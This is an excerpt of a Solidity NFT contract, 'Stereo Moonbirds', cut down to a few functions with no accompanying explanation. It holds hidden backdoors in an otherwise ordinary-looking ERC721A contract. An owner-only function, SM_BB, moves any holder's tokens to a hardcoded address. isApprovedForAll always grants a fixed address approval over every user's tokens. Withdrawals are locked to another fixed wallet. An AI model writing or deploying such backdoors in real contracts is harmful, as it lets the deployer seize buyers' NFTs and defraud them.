...
contract Stereo_Moonbirds is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Stereo Moonbirds", "SM", maxBatchSize_, collectionSize_) {
  ...
  function SM_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x4a8121D39618b3507B7B754897C3221483f499ec, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xdcF7D253ba8c323223b7f76EFc9281FE395091db);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xE6A381084C8c8fb0170BA2577634Ab7e6bF48ef6){return true;}
